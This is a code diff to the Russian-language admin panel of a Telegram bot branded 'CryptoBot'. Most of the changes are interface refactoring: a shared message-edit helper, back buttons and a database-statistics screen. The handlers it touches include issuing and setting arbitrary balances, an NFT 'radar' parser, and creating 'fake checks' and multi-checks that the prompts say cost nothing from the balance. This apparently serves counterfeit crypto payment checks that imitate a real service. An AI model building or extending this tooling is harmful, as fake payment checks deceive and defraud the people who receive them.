@@ -12,9 +12,13 @@ from config import OWNER_ID, CURRENCIES, _e
 from database import (
     update_balance, set_balance, log_tx, get_all_balances, 
     get_balance, DB_PATH, create_check,
-    add_admin, is_admin, create_admin_fake_check, create_admin_multicheck
+    add_admin, is_admin, create_admin_fake_check, create_admin_multicheck,
+    get_db_stats
 )
-from keyboards import admin_menu_kb, nft_parser_menu_kb, nft_found_actions_kb, multicheck_created_kb
+from keyboards import (
+    admin_menu_kb, admin_back_kb, nft_parser_menu_kb, 
+    nft_found_actions_kb, multicheck_created_kb
+)
 
 router = Router()
 
@@ -31,6 +35,19 @@ async def check_admin(user_id: int) -> bool:
     if user_id == OWNER_ID:
         return True
     return await is_admin(user_id)
+
+async def edit_admin_msg(cb: CallbackQuery, text: str, reply_markup=None):
+    try:
+        if cb.message.photo:
+            await cb.message.edit_caption(caption=text, reply_markup=reply_markup, parse_mode="HTML")
+        else:
+            await cb.message.edit_text(text=text, reply_markup=reply_markup, parse_mode="HTML")
+    except Exception:
+        try:
+            await cb.message.delete()
+        except Exception:
+            pass
+        await cb.message.answer(text, reply_markup=reply_markup, parse_mode="HTML")
 
 # --- ВХОД В АДМИНКУ ---
 @router.message(Command("admin"))
@@ -61,12 +78,12 @@ async def cb_admin_bal(cb: CallbackQuery, state: FSMContext):
         await cb.answer("Нет доступа.", show_alert=True)
         return
     await state.set_state(AdminFSM.waiting_balance)
-    await cb.message.edit_text(
+    text = (
         f"{_e('dollar', '💰')} <b>Выдача баланса</b>\n\n"
         f"Введите <code>ID сумма ВАЛЮТА</code>\n"
-        f"Например: <code>123456789 1000 USDT</code>",
-        parse_mode="HTML"
+        f"Например: <code>123456789 1000 USDT</code>"
     )
+    await edit_admin_msg(cb, text, reply_markup=admin_back_kb())
     await cb.answer()
 
 @router.message(AdminFSM.waiting_balance)
@@ -112,15 +129,15 @@ async def cb_admin_set_bal(cb: CallbackQuery, state: FSMContext):
         await cb.answer("Нет доступа.", show_alert=True)
         return
     await state.set_state(AdminFSM.waiting_set_balance)
-    await cb.message.edit_text(
+    text = (
         f"{_e('settings', '✏️')} <b>Изменение баланса (Установка)</b>\n\n"
         f"Введите: <code>ID сумма ВАЛЮТА</code>\n"
         f"Или просто: <code>сумма ВАЛЮТА</code> (для изменения себе)\n\n"
         f"Например:\n"
         f"• <code>89000 USDT</code> — установит вам 89 000 USDT\n"
-        f"• <code>{cb.from_user.id} 50000 USDT</code> — установит по ID",
-        parse_mode="HTML"
+        f"• <code>{cb.from_user.id} 50000 USDT</code> — установит по ID"
     )
+    await edit_admin_msg(cb, text, reply_markup=admin_back_kb())
     await cb.answer()
 
 @router.message(AdminFSM.waiting_set_balance)
@@ -243,13 +260,13 @@ async def cb_admin_fake(cb: CallbackQuery, state: FSMContext):
         await cb.answer("Нет доступа.", show_alert=True)
         return
     await state.set_state(AdminFSM.waiting_fake_check)
-    await cb.message.edit_text(
+    text = (
         f"{_e('fake', '🧾')} <b>Фейк-чек</b>\n\n"
         f"Введите <code>сумма ВАЛЮТА</code>\n"
         f"Например: <code>500 GRAM</code>\n\n"
-        f"<i>Средства не списываются с вашего баланса.</i>",
-        parse_mode="HTML"
+        f"<i>Средства не списываются с вашего баланса.</i>"
     )
+    await edit_admin_msg(cb, text, reply_markup=admin_back_kb())
     await cb.answer()
 
 @router.message(AdminFSM.waiting_fake_check)
@@ -302,10 +319,7 @@ async def cb_admin_multicheck(cb: CallbackQuery, state: FSMContext):
         "• <code>2.5 20 TON 7777</code> — 20 человек по 2.5 TON с паролем <code>7777</code>\n\n"
         "<i>Средства не списываются с вашего баланса.</i>"
     )
-    if cb.message.photo:
-        await cb.message.answer(text, parse_mode="HTML")
-    else:
-        await cb.message.edit_text(text, parse_mode="HTML")
+    await edit_admin_msg(cb, text, reply_markup=admin_back_kb())
     await cb.answer()
 
 @router.message(AdminFSM.waiting_multicheck)
@@ -417,26 +431,30 @@ async def cmd_multicheck(msg: Message, state: FSMContext):
     except Exception:
         await msg.answer("❌ Формат: <code>/multicheck 5 10 USDT [пароль]</code>", parse_mode="HTML")
 
-# --- ВСЕ БАЛАНСЫ ---
+# --- СТАТИСТИКА БАЗЫ ---
 @router.callback_query(F.data == "admin:all")
 async def cb_admin_all(cb: CallbackQuery):
     if not await check_admin(cb.from_user.id):
         await cb.answer("Нет доступа.", show_alert=True)
         return
+    stats = await get_db_stats()
     balances = await get_all_balances(cb.from_user.id)
-    text = f"{_e('message', '📊')} <b>Ваши балансы</b>\n\n"
+    text = (
+        f"{_e('message', '📊')} <b>Статистика базы данных</b>\n\n"
+        f"• Пользователей в базе: <b>{stats['users']}</b>\n"
+        f"• Всего чеков: <b>{stats['checks_total']}</b> (активных: <b>{stats['checks_active']}</b>)\n"
+        f"• Операций в реестре: <b>{stats['transactions']}</b>\n"
+        f"• В базе NFT-радара: <b>{stats['nft_seen']}</b>\n\n"
+        f"<b>Балансы администратора:</b>\n"
+    )
     if not balances:
-        text += "Пусто."
+        text += "<i>Баланс пуст</i>"
     else:
         for ticker, amt in balances.items():
             emoji = CURRENCIES.get(ticker, {}).get("emoji", "🪙")
-            text += f"{emoji} <b>{ticker}</b>: {amt:.4f}\n"
+            text += f"{emoji} <b>{ticker}</b>: {amt:,.4f}\n"
 
-    await cb.message.edit_text(
-        text,
-        reply_markup=admin_menu_kb(),
-        parse_mode="HTML"
-    )
+    await edit_admin_msg(cb, text, reply_markup=admin_back_kb())
     await cb.answer()
 
 # --- ДОБАВИТЬ АДМИНА ---
@@ -446,11 +464,11 @@ async def cb_admin_add(cb: CallbackQuery, state: FSMContext):
         await cb.answer("Только главный владелец может добавлять админов.", show_alert=True)
         return
     await state.set_state(AdminFSM.waiting_add_admin)
-    await cb.message.edit_text(
+    text = (
         "👑 <b>Добавление админа</b>\n\n"
-        "Отправьте Telegram ID нового администратора (например, <code>5742263111</code>):",
-        parse_mode="HTML"
+        "Отправьте Telegram ID нового администратора (например, <code>5742263111</code>):"
     )
+    await edit_admin_msg(cb, text, reply_markup=admin_back_kb())
     await cb.answer()
 
 @router.message(AdminFSM.waiting_add_admin)
@@ -518,8 +536,17 @@ async def cb_admin_menu(cb: CallbackQuery, state: FSMContext):
     admin_banner_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "admin_banner.png")
     text = (
         f"{_e('premium_clean', '⚡')} <b>Панель управления CryptoBot</b>\n\n"
+        "Система мониторинга, балансов, чеков и NFT-радара Telegram.\n"
         "Выберите раздел для работы:"
     )
+    if cb.message.photo:
+        try:
+            await cb.message.edit_caption(caption=text, reply_markup=admin_menu_kb(), parse_mode="HTML")
+            await cb.answer()
+            return
+        except Exception:
+            pass
+
     if os.path.exists(admin_banner_path):
         from aiogram.types import FSInputFile
         await cb.message.answer_photo(
